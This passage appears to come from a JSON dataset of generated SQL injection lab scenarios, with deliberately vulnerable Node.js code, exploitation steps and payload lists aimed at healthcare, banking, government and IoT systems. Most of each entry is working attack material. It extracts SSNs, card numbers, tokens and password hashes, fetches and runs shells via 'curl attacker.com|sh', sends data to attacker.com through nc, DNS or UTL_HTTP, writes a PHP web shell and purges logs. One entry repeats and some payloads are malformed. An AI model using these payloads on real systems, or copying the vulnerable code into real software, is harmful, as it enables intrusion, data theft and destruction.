    "Solution Steps": [
      "Decode JWT using jwt.io and modify 'sub' claim",
      "Forge token: ' UNION SELECT SSN FROM patients FOR JSON PATH--",
      "Bypass signature validation using 'none' algorithm",
      "Parse JSON conversion errors containing SSN fragments",
      "Reconstruct full SSNs using differential analysis"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/profile', (req, res) => {\n  const userId = jwtVerify(req.headers.auth).sub;\n  const query = `SELECT * FROM users WHERE id = '${userId}'`;\n  \n  sql.query(query, (err, result) => {\n    res.json(result.recordset[0]);\n  });\n});",
    "payloads": [
      "' OR 1=CONVERT(INT, (SELECT TOP 1 SSN FROM patients))--",
      "' AND (SELECT COUNT(*) FROM sys.tables)=42--"
    ]
  },
  {
    "Lab scenario": "IoT Sensor Network Boolean-Based SQLi in Data Filtering",
    "Lab Description": "Sensor data dashboard uses unsanitized input in HAVING clauses with SQLite. The REST API returns HTTP 200 for true queries through misconfigured row existence checks. To solve: Extract device encryption keys through BITAND() comparisons of SUBSTR(hex(key),1,1) values.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Fuzz POST /sensor-filter endpoint with OWASP ZAP",
      "Identify boolean trigger: ' HAVING 1=1 AND (SELECT hex(substr(key,1,1)) FROM devices)='41'--",
      "Automate with Python Requests and bitwise analysis",
      "Brute-force 256-bit keys using response differentials",
      "Decrypt MQTT traffic using extracted keys"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/sensor-filter', (req, res) => {\n  const filter = req.body.having;\n  const query = `SELECT sensor_id FROM readings\n    GROUP BY sensor_id HAVING ${filter}`;\n  \n  db.get(query, (err, row) => {\n    res.status(row ? 200 : 404).send();\n  });\n});",
    "payloads": [
      "1=1 AND (ASCII(SUBSTR(key,1,1)) & 128)=128",
      "EXISTS(SELECT 1 FROM sqlite_master WHERE tbl_name='encryption_keys')"
    ]
  },
  {
    "Lab scenario": "Healthcare Portal UNION SQLi in Radiology Reports",
    "Lab Description": "DICOM report viewer concatenates user input into PostgreSQL ORDER BY clauses. The application leaks sensitive metadata through verbose COPY command errors. To solve: Extract encrypted patient diagnoses using NULL-padded UNION payloads and hex encoding.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept GET /reports?sort=date with Burp Suite",
      "Determine column count using incremental ORDER BY",
      "Craft payload: date UNION SELECT NULL,ENCODE(diagnosis::bytea,'hex'),NULL,NULL--",
      "Bypass CSV formatting using CHR(9) separators",
      "Reconstruct diagnoses from hex-encoded responses"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/reports', (req, res) => {\n  const sort = req.query.sort || 'date';\n  const query = `SELECT * FROM radiology_reports ORDER BY ${sort}`;\n  \n  pool.query(query, (err, result) => {\n    if(err) {\n      console.error(`COPY error: ${err.message}`);\n      res.status(500).send('Report generation failed');\n    } else {\n      res.attachment('reports.csv');\n    }\n  });\n});",
    "payloads": [
      "date UNION SELECT NULL,pg_read_file('/etc/passwd'),NULL,NULL--",
      "patient_id UNION SELECT NULL,current_setting('data_directory'),NULL,NULL--"
    ]
  },
  {
    "Lab scenario": "E-Commerce Platform Error-Based SQLi in Product Filter",
    "Lab Description": "Product search feature uses unsanitized input in MySQL WHERE clauses. The application leaks database structure through GEOMETRY type conversion errors in MariaDB. To solve: Extract PCI-compliant credit card numbers using ST_GeomFromText() function exploitation.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Modify GET /products?filter=electronics request",
      "Inject payload: ' OR ST_GeomFromText(CONCAT('POINT(',pan,')'))--",
      "Parse credit card numbers from WKT parsing errors",
      "Bypass column truncation using SUBSTRING()",
      "Validate through payment gateway API"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/products', (req, res) => {\n  const filter = req.query.filter;\n  const query = `SELECT * FROM products WHERE category='${filter}'`;\n  \n  pool.query(query, (err, result) => {\n    res.json(err ? {error: err.sqlMessage} : result.rows);\n  });\n});",
    "payloads": [
      "' OR ST_GeomFromText('POINT('||pan||')') IS NULL--",
      "' UNION SELECT NULL,JSON_OBJECT('pan',pan),NULL FROM payments--"
    ]
  },
  {
    "Lab scenario": "Government API Gateway UNION SQLi in XML Processing",
    "Lab Description": "SOAP endpoint processes XML input with vulnerable XPath extraction into PostgreSQL queries. The Java backend allows UNION injections through CDATA section bypasses. To solve: Exfiltrate classified documents using xmlagg() and base64 encoding.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Craft XML payload with CDATA-wrapped SQL",
      "Inject: <![CDATA[' UNION SELECT xmlagg(xmlelement(name d, pg_read_file('/classified.txt'))) FROM generate_series(1,1)--]]>",
      "Bypass XML validation using external entities",
      "Parse base64-encoded results from malformed responses",
      "Reconstruct documents using chunked decoding"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/soap', (req, res) => {\n  const xml = req.rawBody;\n  const param = extractXPath(xml, '//searchParam');\n  const query = `SELECT * FROM documents WHERE content='${param}'`;\n  \n  pool.query(query, (err, result) => {\n    res.xml(result.rows);\n  });\n});",
    "payloads": [
      "<![CDATA[' UNION SELECT ENCODE(pg_read_file('/etc/passwd')::bytea,'base64')--]]>",
      "'||(SELECT xmlagg(xmlelement(name f, ftw())) FROM pg_catalog--"
    ]
  },
  {
    "Lab scenario": "IoT Fleet Management Stacked SQLi via MQTT",
    "Lab Description": "Vehicle telemetry system processes MQTT payloads in PostgreSQL without input validation. The C++ backend allows stacked queries through PQexec() non-atomic execution. To solve: Execute remote code via COPY FROM PROGRAM and establish persistent access.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Subscribe to vehicle/update topic with mosquitto_sub",
      "Publish payload: '; COPY diagnostics FROM PROGRAM 'curl https://attacker.com/shell.sh|sh'--",
      "Bypass payload size limits via message chunking",
      "Monitor reverse shell connections",
      "Escalate privileges using SET ROLE fleet_admin"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "void mqttCallback(char* topic, byte* payload) {\n  char query[256];\n  snprintf(query, sizeof(query),\n    \"UPDATE vehicles SET status = '%s'\",\n    payload);\n  PQexec(conn, query);\n}",
    "payloads": [
      "'; DROP TABLE IF EXISTS access_logs CASCADE--",
      "'; CREATE SERVER exfil FOREIGN DATA WRAPPER dblink_fdw--"
    ]
  },
  {
    "Lab scenario": "IoT Dashboard Boolean-Blind SQLi in Sensor Filtering",
    "Lab Description": "A Zigbee device management interface constructs SQLite queries with unsanitized HAVING clauses in sensor aggregation reports. The REST API returns HTTP 200/404 status codes through misconfigurened rowCount checks. To solve: Extract AWS IoT Core certificates via bitwise binary search of SUBSTR(hex(cert),1,1) comparisons using automated response analysis.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Fuzz POST /telemetry endpoint with OWASP ZAP",
      "Identify boolean trigger: ' HAVING 1=1 AND (SELECT hex(substr(cert,1,1)) FROM iot_certs)='41'--",
      "Automate with sqlmap: sqlmap -u ... --technique=B --level=5",
      "Brute-force 256-bit keys using Python Requests with bit-shifting logic",
      "Validate certificates through MQTT publish command"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/telemetry', (req, res) => {\n  const filter = req.body.having;\n  const query = `SELECT sensor_id FROM readings\n    GROUP BY sensor_id HAVING ${filter}`;\n  \n  db.get(query, (err, row) => {\n    res.status(row ? 200 : 404).send();\n  });\n});",
    "payloads": [
      "1=1 AND (SELECT COUNT(*) FROM sqlite_master WHERE tbl_name='credentials')=1--",
      "EXISTS(SELECT 1 FROM iot_certs WHERE device_type='critical')--"
    ]
  },
  {
    "Lab scenario": "E-Commerce Platform UNION SQLi in JSON Filter",
    "Lab Description": "A product search API processes JSON array filters directly in PostgreSQL WHERE clauses through vulnerable Node.js middleware. The application allows type confusion attacks through improper array validation. To solve: Bypass parameterized queries using nested JSON objects and extract PCI tokens through base64-encoded UNION payloads.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Modify Content-Type to application/json in Postman",
      "Craft payload: {\"filters\":[{\"field\":\"1\",\"value\":\"1' UNION SELECT NULL,ENCODE(token::bytea,'base64') FROM payments--\"}]}",
      "Bypass WAF using \\u0027 Unicode escapes",
      "Decode base64 results using CyberChef",
      "Validate tokens through payment gateway sandbox"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/api/search', (req, res) => {\n  const filters = req.body.map(f => `${f.field}=${f.value}`).join(' AND ');\n  const query = `SELECT * FROM products WHERE ${filters}`;\n  \n  pool.query(query, (err, result) => {\n    res.json(result.rows);\n  });\n});",
    "payloads": [
      "[{\"field\":\"1\",\"value\":\"1' UNION SELECT version(),NULL--\"}]",
      "[{\"field\":\"price\",\"value\":\"0 OR 1=1 UNION SELECT pg_read_file('/etc/passwd'),NULL--\"}]"
    ]
  },
  {
    "Lab scenario": "Government Portal Error-Based SQLi in PDF Export",
    "Lab Description": "A classified document export feature constructs vulnerable COPY queries with user-controlled ORDER BY clauses in PostgreSQL. The Java backend leaks AWS credentials through verbose error messages containing IAM role details. To solve: Exfiltrate access keys using CTE expressions and forced geometry conversion errors.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept POST /export?sort=date with Burp Suite",
      "Inject: date UNION SELECT NULL,aws_credentials FROM iam_roles--",
      "Bypass CSV escaping using tab characters (CHR(9))",
      "Parse leaked credentials from ST_GeomFromText errors",
      "Validate through AWS CLI S3 access"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/export', (req, res) => {\n  const sort = req.body.sort;\n  const query = `COPY (\n    SELECT * FROM reports ORDER BY ${sort}\n  ) TO STDOUT CSV HEADER`;\n  \n  pool.query(query);\n  res.attachment('report.csv');\n});",
    "payloads": [
      "date); WITH exfil AS (SELECT * FROM iam_roles) SELECT * FROM exfil--",
      "id UNION SELECT NULL,ST_GeomFromText('POINT(' || access_key || ')')--"
    ]
  },
  {
    "Lab scenario": "API Gateway JWT-Based SQLi in Profile Endpoint",
    "Lab Description": "A user profile endpoint incorporates JWT 'sub' claims directly into SQL Server OPENJSON queries. The .NET backend leaks encrypted SSNs through XML conversion errors. To solve: Extract sensitive data using forced type mismatches in JSON_VALUE() path expressions.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Decode JWT using jwt.io and modify 'sub' claim",
      "Forge token: ' UNION SELECT SSN FROM patients FOR JSON PATH--",
      "Bypass signature validation using 'none' algorithm",
      "Parse JSON errors for SSN fragments",
      "Reconstruct full SSNs using differential analysis"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/profile', (req, res) => {\n  const userId = jwtVerify(req.headers.auth).sub;\n  const query = `SELECT * FROM users WHERE id = '${userId}'`;\n  \n  sql.query(query, (err, result) => {\n    res.json(result.recordset[0]);\n  });\n});",
    "payloads": [
      "' OR 1=CONVERT(INT, (SELECT TOP 1 SSN FROM patients))--",
      "' AND (SELECT COUNT(*) FROM sys.tables)=42--"
    ]
  },
  {
    "Lab scenario": "CMS Platform Second-Order SQLi in Scheduled Report Generation",
    "Lab Description": "A content management system stores unsanitized user comments that are later used in PostgreSQL queries during nightly report generation. The Node.js backend executes vulnerable SQL statements through a cron job without input validation. To solve: Inject a payload during comment submission that triggers remote code execution via database functions during report processing.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept POST /comment request with Burp Suite",
      "Craft payload: '); CREATE TEMP TABLE exfil AS SELECT * FROM admin_credentials--",
      "Wait for 02:00 AM report generation trigger",
      "Execute OS command: '); COPY exfil TO PROGRAM 'curl https://attacker.com/?exfil=$(base64 /etc/passwd)'--",
      "Escalate privileges using COPY FROM PROGRAM for reverse shell creation"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst pool = require('./db').pool;\nconst nodeCron = require('node-cron');\n\napp.post('/comment', (req, res) => {\n  const comment = req.body.text;\n  const query = `INSERT INTO comments (content) VALUES ('${comment}')`;\n  \n  pool.query(query, (err) => {\n    if(err) console.error(`Comment insertion error: ${err.stack}`);\n    res.send('Comment submitted for moderation');\n  });\n});\n\n// Nightly report generation\nnodeCron.schedule('0 2 * * *', () => {\n  const reportQuery = `SELECT content FROM comments \n    WHERE created_at > CURRENT_DATE - INTERVAL '1 day'`;\n  \n  pool.query(reportQuery, (err, result) => {\n    if(err) {\n      console.error(`Report generation failed: ${err.message}`);\n      return;\n    }\n    generatePDFReport(result.rows); // Vulnerable PDF creation\n  });\n});",
    "payloads": [
      "'); CREATE TABLE exfil (data TEXT); INSERT INTO exfil SELECT * FROM ssh_keys--",
      "'); COPY (SELECT * FROM /etc/passwd) TO PROGRAM 'nc attacker.com 4444'--",
      "'||(SELECT pg_sleep(5) WHERE SUBSTR(version(),1,1)='P')--"
    ]
  },
  {
    "Lab scenario": "Healthcare API Gateway UNION-Based SQLi in Patient Search Endpoint",
    "Lab Description": "A HIPAA-compliant healthcare API contains vulnerable patient search functionality using unsanitized JSON input in WHERE clause construction. The application returns detailed error messages through debug headers and allows UNION operators. To solve: Extract Social Security Numbers from the 'patients' table while bypassing input sanitization that strips quotes and spaces. Successful exploitation requires content-type manipulation and NULL byte injection.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Capture POST /api/patients/search request in Burp Suite with Content-Type: application/json",
      "2. Identify injectable JSON parameter: {\"name\": \"'test'\"} triggering SQL error",
      "3. Use Postman to send URL-encoded payload: {\"name\": \"'\\u0000'UNION/**/SELECT\\u0020NULL,ssn,NULL\\u0020FROM\\u0020patients--\"}",
      "4. Bypass WAF with unicode normalization: '||CAST(ssn AS CHAR(11))||'",
      "5. Verify SSN extraction via response body and purge access logs using stacked query: ; DELETE FROM request_logs--"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst mysql = require('mysql2/promise');\nconst app = express();\napp.use(express.json());\n\nconst pool = mysql.createPool({\n  host: 'localhost',\n  user: 'healthcare_api',\n  password: 'insecure123',\n  database: 'patient_records',\n  insecureAuth: true\n});\n\napp.post('/api/patients/search', async (req, res) => {\n  try {\n    const filters = req.body;\n    let query = \"SELECT id, full_name, dob FROM patients WHERE \";\n    const conditions = [];\n    \n    Object.entries(filters).forEach(([key, val]) => {\n      conditions.push(`${key} = '${val}'`); // Vulnerable template literal\n    });\n    \n    query += conditions.join(' AND ');\n    console.debug(\"Final query:\", query); // Verbose logging\n    \n    const [rows] = await pool.query(query);\n    res.set('X-Debug-Query', query); // Leaks query through header\n    res.json(rows);\n  } catch (err) {\n    res.status(500).set('X-SQL-Error', err.sqlMessage).json({error: \"Query failed\"});\n  }\n});\n\napp.listen(3000, () => console.log('Healthcare API running on port 3000'));",
    "payloads": [
      "{\"name\":\"'UNION SELECT NULL,ssn,NULL FROM patients--\"}",
      "'||(SELECT MID((SELECT ssn FROM patients LIMIT 1),1,3))||'",
      "'/**/UNION/*!50000SELECT*/table_name,column_name,NULL/*!FROM*/information_schema.columns--",
      "'%00' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3--"
    ]
  },
  {
    "Lab scenario": "E-Commerce Platform Boolean-Blind SQLi in Product Filter GROUP BY",
    "Lab Description": "An online marketplace's product filtering system concatenates user-controlled parameters into GROUP BY clauses without validation. The application provides no direct error feedback but returns HTTP 200 when queries succeed. To solve: Determine administrator password hash through boolean response analysis using bit-shifting techniques and conditional error triggers.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Intercept GET /products?sort=rating request in OWASP ZAP",
      "2. Identify injection point: sort=rating'%2b(select%200)",
      "3. Develop python script using requests.Session() to brute-force password bits:",
      "   (SELECT ASCII(SUBSTR(password,1)) >> 7 & 1",
      "4. Optimize with binary search tree pattern matching",
      "5. Crack extracted SHA256 hash using hashcat -m 1400"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst pg = require('pg');\nconst app = express();\n\napp.get('/products', async (req, res) => {\n  const { sort } = req.query;\n  const client = new pg.Client(process.env.DB_URL);\n  \n  try {\n    await client.connect();\n    const query = `\n      SELECT category, AVG(rating) \n      FROM products \n      GROUP BY ${sort || 'category'} \n      HAVING COUNT(*) > 10`;\n    \n    console.warn(\"Executing grouping:\", query);\n    const result = await client.query(query);\n    res.json(result.rows);\n  } catch (err) {\n    res.status(400).end(); // Blind error handling\n  } finally {\n    await client.end();\n  }\n});\n\napp.listen(3000);",
    "payloads": [
      "category,(CASE WHEN (SELECT SUBSTR(password,1)='a') THEN 1 ELSE 1/(SELECT 0) END)",
      "(SELECT CASE WHEN (ASCII(SUBSTR(password,1))&1>0 THEN 1 ELSE 0 END)",
      "(SELECT 1 FROM users WHERE username='admin' AND password LIKE 'a%')",
      "(SELECT 1 WHERE EXISTS(SELECT 1 FROM pg_sleep(2)))--"
    ]
  },
  {
    "Lab scenario": "Government Portal Time-Based SQLi in Document Search Pagination",
    "Lab Description": "A municipal document archive system contains vulnerable LIMIT/OFFSET parameters in its PostgreSQL backend. The application provides no visual feedback but allows stacked queries. To solve: Exfiltrate sensitive tax records through DNS-based out-of-band channel using pg_sleep() conditional delays and COPY TO PROGRAM vector.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Identify injectable parameter: GET /docs?page=1",
      "2. Verify time delay: 1; SELECT CASE WHEN 1=1 THEN pg_sleep(5) ELSE NULL END--",
      "3. Configure Interactsh client for DNS callback monitoring",
      "4. Craft payload: 1; COPY (SELECT tax_id FROM records) TO PROGRAM 'nslookup $(tax_id).attacker.com'--",
      "5. Correlate DNS logs with extracted tax IDs"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst { Pool } = require('pg');\nconst app = express();\n\nconst pool = new Pool({\n  host: 'localhost',\n  database: 'gov_docs',\n  ssl: false\n});\n\napp.get('/docs', async (req, res) => {\n  const page = parseInt(req.query.page) || 1;\n  const offset = (page - 1) * 10;\n  \n  try {\n    const query = `\n      SELECT doc_id, title \n      FROM public_documents \n      LIMIT 10 OFFSET ${offset}`; // Unsafe pagination\n    \n    const result = await pool.query(query);\n    res.json(result.rows);\n  } catch (err) {\n    res.status(500).send('Internal error');\n  }\n});\n\napp.listen(3000);",
    "payloads": [
      "1; SELECT CASE WHEN 1=1 THEN pg_sleep(10) END--",
      "0; DROP TABLE IF EXISTS exfil; CREATE TABLE exfil(data text); COPY exfil FROM PROGRAM 'curl http://attacker.com/?`ls`'--",
      "1%3b%20CREATE%20OR%20REPLACE%20FUNCTION%20exfil%28TEXT%29%20RETURNS%20VOID%20AS%20$$%20COPY%20tmp%20FROM%20PROGRAM%20%27nslookup%20%27||$1||%27.attacker.com%27%3b%20$$%20LANGUAGE%20SQL%3b%20SELECT%20exfil%28tax_id%29%20FROM%20records--",
      "0' UNION SELECT NULL,(SELECT current_database())--"
    ]
  },
  {
    "Lab scenario": "Social Media Platform UNION SQLi in Friend Search ORDER BY",
    "Lab Description": "A dating application's friend recommendation feature constructs ORDER BY clauses directly from user input. The MySQL backend returns unionized results in JSON responses. To solve: Extract OAuth tokens from the 'sessions' table using column type-matching and hex-encoded payloads while bypassing JSON escaping filters.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Intercept POST /api/friends/search with sort=popularity",
      "2. Determine column count using ORDER BY 9999--",
      "3. Match JSON array types: ' UNION SELECT 1,0x7b226f61757468223a22746f6b656e227d,NULL--",
      "4. Extract session tokens: ' UNION SELECT 1,HEX(token),user_id FROM sessions--",
      "5. Decode hexadecimal values and hijack admin session"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst mysql = require('mysql');\nconst app = express();\n\nconst conn = mysql.createConnection({\n  host: 'localhost',\n  user: 'social_app',\n  password: 'weakpass',\n  database: 'user_profiles'\n});\n\napp.post('/api/friends/search', (req, res) => {\n  const { sort } = req.body;\n  const query = `\n    SELECT user_id, name, popularity \n    FROM users \n    ORDER BY ${sort} \n    LIMIT 50`;\n\n  conn.query(query, (err, results) => {\n    if (err) return res.status(500).json({error: err.code});\n    res.json(results.map(u => ({...u, token: undefined})));\n  });\n});\n\napp.listen(3000);",
    "payloads": [
      "(SELECT 1,TO_BASE64(token),3 FROM sessions) UNION--",
      "' UNION SELECT 1,CONVERT(token USING utf8mb4),3 FROM sessions--",
      "1 PROCEDURE ANALYSE((EXTRACTVALUE(1,CONCAT(0x3a,(SELECT token)))),1)--",
      "' AND MAKE_SET(1,TOKEN) IS NOT NULL--"
    ]
  },
  {
    "Lab scenario": "Banking App Error-Based SQLi in Account Balance HAVING Clause",
    "Lab Description": "A mobile banking web interface contains vulnerable HAVING clause construction in its balance aggregation feature. The Microsoft SQL Server backend returns detailed error messages through verbose logging. To solve: Extract account numbers and balances using error-induced data exfiltration and second-order injection via scheduled transactions.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Trigger error: HAVING 1=convert(int,(SELECT user))--",
      "2. Extract table structure via error messages",
      "3. Craft nested error payload: HAVING 1=CONVERT(INT,(SELECT TOP 1 balance FROM accounts))--",
      "4. Schedule recurring transfer using stacked queries: ; INSERT INTO transfers VALUES ('attacker', @@version)--",
      "5. Retrieve results from scheduled jobs table"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst mssql = require('mssql');\nconst app = express();\n\nconst config = {\n  user: 'bank_user',\n  password: 'P@ssw0rd1',\n  server: 'localhost',\n  options: { encrypt: false }\n};\n\napp.get('/api/balances', async (req, res) => {\n  try {\n    const pool = await mssql.connect(config);\n    const query = `\n      SELECT user_id, SUM(balance) \n      FROM accounts \n      GROUP BY user_id \n      HAVING ${req.query.filter || '1=1'}`;\n    \n    const result = await pool.request().query(query);\n    res.json(result.recordset);\n  } catch (err) {\n    console.error('Full error:', err.originalError);\n    res.status(500).send(err.message);\n  }\n});\n\napp.listen(3000);",
    "payloads": [
      "1=CONVERT(int,(SELECT TOP 1 account_number FROM accounts))--",
      "' AND 1=CAST((SELECT balance FROM accounts) AS INT)--",
      "; BEGIN TRANSACTION; INSERT INTO transfers VALUES ('attacker', (SELECT TOP 1 password FROM users)); COMMIT--",
      "HAVING 1 IN (SELECT password FROM users WHERE username='admin')--"
    ]
  },
  {
    "Lab scenario": "IoT Device Manager Blind SQLi in Sensor Group Filter",
    "Lab Description": "An industrial IoT control panel contains vulnerable input handling in sensor grouping parameters. The SQLite backend provides no error feedback but returns HTTP 404 when queries fail. To solve: Map database schema through boolean response analysis and timing attacks using nested CASE statements and WAL journal analysis.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Identify injection point: POST /api/sensors group_ids[]=1",
      "2. Develop boolean inference script using 404 status as false indicator",
      "3. Brute-force table names: group_ids[]=1 AND (SELECT 1 FROM sqlite_master WHERE tbl_name LIKE 'a%')",
      "4. Optimize with binary search on ASCII values",
      "5. Exfiltrate admin credentials using differential response timing"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst sqlite3 = require('sqlite3');\nconst app = express();\napp.use(express.json());\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE sensors (id INT, group_id INT, value REAL)\");\n  db.run(\"INSERT INTO sensors VALUES (1, 1, 23.5)\");\n});\n\napp.post('/api/sensors', (req, res) => {\n  const groups = req.body.group_ids || [1];\n  const query = `\n    SELECT * FROM sensors \n    WHERE group_id IN (${groups.join(',')})`;\n\n  db.all(query, (err, rows) => {\n    if (err || rows.length === 0) return res.status(404).end();\n    res.json(rows);\n  });\n});\n\napp.listen(3000);",
    "payloads": [
      "1) AND (SELECT COUNT(*) FROM sqlite_master) > 0--",
      "1 AND (SELECT HEX(substr(sql,1)) FROM sqlite_master LIMIT 1) > '41'--",
      "1 AND (SELECT CASE WHEN (SELECT COUNT(*) FROM users)=3 THEN 1 ELSE 0 END)--",
      "1 AND RANDOMBLOB(1000000000)--"
    ]
  },
  {
    "Lab scenario": "REST API UNION SQLi in User Search Endpoint",
    "Lab Description": "A user management REST API contains vulnerable parameter binding in search queries. The PostgreSQL backend allows UNION operators but requires explicit type casting. To solve: Extract bcrypt password hashes using column type coercion and array_agg() functions while bypassing input length restrictions.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Identify injectable GET /users?search= parameter",
      "2. Determine column count using NULL::text casting",
      "3. Bypass length filter with substring aggregation: UNION SELECT NULL,(SELECT string_agg(substr(password,1,10),'') FROM users)--",
      "4. Reassemble full hashes from partial extracts",
      "5. Crack hashes using john --format=bcrypt"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst pg = require('pg');\nconst app = express();\n\napp.get('/users', async (req, res) => {\n  const search = req.query.search || '';\n  const client = new pg.Client();\n  \n  try {\n    await client.connect();\n    const query = `\n      SELECT id, username, created_at \n      FROM users \n      WHERE username LIKE '%${search}%' \n      LIMIT 20`;\n    \n    const result = await client.query(query);\n    res.json(result.rows);\n  } catch (err) {\n    res.status(500).json({error: err.message});\n  }\n});\n\napp.listen(3000);",
    "payloads": [
      "' UNION SELECT NULL,password::text,NULL FROM users--",
      "' AND 1=CAST((SELECT COUNT(*) FROM pg_catalog.pg_tables) AS INT)--",
      "'||(SELECT ARRAY_AGG(password) FROM users)::text||'",
      "'; COPY users TO '/var/www/static/passwords.csv'--"
    ]
  },
  {
    "Lab scenario": "CMS Time-Based SQLi in Article Comment Filter",
    "Lab Description": "A WordPress-based CMS contains vulnerable comment filtering that allows stacked time-based injections. The MySQL backend has FILE privileges but blocks UNION operators. To solve: Write web shell to server using INTO OUTFILE and execute commands through User-Agent validation bypass.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Identify injectable comment_id parameter in moderation panel",
      "2. Verify time delay: 1; SELECT IF(1=1,SLEEP(5),0)--",
      "3. Write PHP shell: 1; SELECT '<?php system($_GET[0]);?>' INTO OUTFILE '/var/www/html/shell.php'--",
      "4. Bypass file extension filters using .php%00.jpg",
      "5. Execute commands via GET /uploads/shell.php?0=id"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst mysql = require('mysql');\nconst app = express();\n\nconst conn = mysql.createConnection({\n  host: 'localhost',\n  user: 'cms_user',\n  password: 'w0rdpr3ss',\n  database: 'wp_db'\n});\n\napp.post('/moderate-comment', (req, res) => {\n  const commentId = req.body.comment_id;\n  const query = `\n    UPDATE wp_comments \n    SET approved=1 \n    WHERE comment_id=${commentId}`;\n\n  conn.query(query, (err) => {\n    if (err) return res.status(500).send(err.sqlMessage);\n    res.send('Comment approved');\n  });\n});\n\napp.listen(3000);",
    "payloads": [
      "1; SELECT SLEEP(10)--",
      "1 INTO OUTFILE '/tmp/pwn' LINES TERMINATED BY 0x3c3f7068702073797374656d28245f4745545b307d293b203f3e--",
      "1 UNION SELECT NULL,LOAD_FILE('/etc/passwd'),NULL INTO DUMPFILE '/var/www/html/leak.txt'--",
      "1; GRANT FILE ON *.* TO 'cms_user'@'localhost'--"
    ]
  },
  {
    "Lab scenario": "Inventory System Second-Order SQLi in CSV Export",
    "Lab Description": "A retail inventory system stores unsanitized user input that gets used in later CSV export queries. The Oracle backend allows PL/SQL injection but filters semicolons. To solve: Poison product descriptions with time-based payloads and trigger export job to execute OS commands via DBMS_SCHEDULER.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Inject product description: '||DBMS_PIPE.RECEIVE_MESSAGE('a',5)--",
      "2. Schedule hourly export job with poisoned entries",
      "3. Trigger CSV generation through UI",
      "4. Exfiltrate data via DNS: SYS.DBMS_LDAP.INIT((SELECT password FROM users)||'.attacker.com',80)",
      "5. Maintain persistence via DBMS_SCHEDULER job creation"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst oracledb = require('oracledb');\nconst app = express();\napp.use(express.urlencoded());\n\napp.post('/products', async (req, res) => {\n  const { name, description } = req.body;\n  const conn = await oracledb.getConnection();\n  \n  try {\n    await conn.execute(\n      `INSERT INTO products (name, desc) \n       VALUES ('${name}', '${description}')`\n    );\n    res.send('Product added');\n  } catch (err) {\n    res.status(500).send(err.message);\n  }\n});\n\napp.listen(3000);",
    "payloads": [
      "'||UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT password FROM users))--",
      "'||DBMS_SCHEDULER.CREATE_JOB('EXEC sys.kill_user(''admin'')')--",
      "'||CTXSYS.DRITHSX.SN(user,(SELECT banner FROM v$version))--",
      "'||DBMS_LDAP.INIT((SELECT SYS_CONTEXT('USERENV','CURRENT_USER') FROM DUAL)||'.exfil.com',80)--"
    ]
  },
  {
    "Lab scenario": "Travel Booking System Out-of-Band SQLi in Loyalty Points",
    "Lab Description": "An airline loyalty program contains vulnerable points redemption logic with MSSQL xp_cmdshell access. The application blocks direct error output but allows DNS-based exfiltration. To solve: Execute reverse shell via SQL injection chain and pivot to internal payment systems using cracked service account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Identify injectable POST /redeem parameter: points=100",
      "2. Verify OOB DNS: 100; EXEC master..xp_cmdshell 'nslookup test.attacker.com'--",
      "3. Encode PowerShell reverse shell in hex",
      "4. Execute payload: ; EXEC xp_cmdshell 'powershell -e <encoded>'--",
      "5. Pivot to internal 10.0.0.0/24 network using cracked mssql_svc credentials"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst mssql = require('mssql');\nconst app = express();\n\nconst config = {\n  user: 'svc_mssql',\n  password: 'P@ssw0rd123',\n  server: 'localhost',\n  options: {\n    enableArithAbort: true,\n    encrypt: false\n  }\n};\n\napp.post('/redeem', async (req, res) => {\n  const { points } = req.body;\n  const pool = await mssql.connect(config);\n  \n  try {\n    await pool.request().query(\n      `UPDATE loyalty SET points = points - ${points} \n       WHERE user_id = 12345`\n    );\n    res.json({ success: true });\n  } catch (err) {\n    res.status(400).json({ error: 'Redemption failed' });\n  }\n});\n\napp.listen(3000);",
